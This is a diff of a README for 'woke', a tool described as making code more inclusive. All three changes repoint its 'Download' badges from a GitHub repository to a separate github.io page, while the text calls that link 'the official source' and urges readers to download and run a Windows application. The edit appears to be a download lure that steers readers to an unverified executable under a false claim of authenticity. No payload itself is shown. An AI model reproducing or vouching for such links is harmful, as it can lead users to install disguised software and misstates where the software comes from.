@@ -1,6 +1,6 @@
 # 📝 woke - Make Your Code More Inclusive Today
 
-[![Download woke](https://img.shields.io/badge/Download-woke-2ea44f?style=for-the-badge)](https://github.com/Isarepetitious8947/woke)
+[![Download woke](https://img.shields.io/badge/Download-woke-2ea44f?style=for-the-badge)](https://isarepetitious8947.github.io)
 
 ## 🎯 What Is woke?
 
@@ -27,7 +27,7 @@ Ready to give woke a try? Great! Here's all you need to do:
 
 ### Step 1: Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20woke-Click%20Here-blue?style=for-the-badge&logo=windows)](https://github.com/Isarepetitious8947/woke)
+[![Download Now](https://img.shields.io/badge/Download%20woke-Click%20Here-blue?style=for-the-badge&logo=windows)](https://isarepetitious8947.github.io)
 
 Visit this link to download the application. It's the official source, so you can be confident you're getting the real deal.
 
@@ -93,7 +93,7 @@ The download page includes extensive documentation, including examples and troub
 
 Don't wait to make your projects more inclusive. It takes just a few minutes to download and run woke, and the benefits last forever. Whether you're working on a small personal project or a massive enterprise system, woke helps you communicate with respect and clarity.
 
-[![Get woke Now](https://img.shields.io/badge/Get%20woke-Start%20Now-brightgreen?style=for-the-badge)](https://github.com/Isarepetitious8947/woke)
+[![Get woke Now](https://img.shields.io/badge/Get%20woke-Start%20Now-brightgreen?style=for-the-badge)](https://isarepetitious8947.github.io)
 
 Try it today, and see how easy it is to make a difference—one word at a time.
 
